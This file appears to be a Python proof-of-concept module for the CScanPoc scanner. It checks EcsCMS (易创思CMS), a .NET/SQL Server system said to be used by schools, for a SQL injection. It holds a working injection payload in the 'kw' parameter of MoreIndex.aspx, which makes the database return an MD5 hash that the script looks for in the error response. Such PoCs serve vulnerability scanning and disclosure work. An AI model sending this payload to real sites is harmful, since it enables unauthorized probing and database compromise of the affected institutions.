# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'EcsCMS_0000' # 平台漏洞编号，留空
    name = '易创思CMS SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-04-02'  # 漏洞公布时间
    desc = '''
        EcsCMS(易创思CMS) SQL注入漏洞，.net+sqlserver注射，影响众多学校及教育机构。
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=088844' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'EcsCMS(易创思CMS)'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'Unkonwn' # 平台 POC 编号，留空
    author = '国光'  # POC编写者
    create_date = '2018-05-22' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url=arg+"/MoreIndex.aspx?pkId=0&kw=a%27%20And%201=(select%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27)))--&st=2&t=1"
            code,head,res,errcode,_=hh.http(url)
            if code==500 and "c4ca4238a0b923820dcc509a6f75849b" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()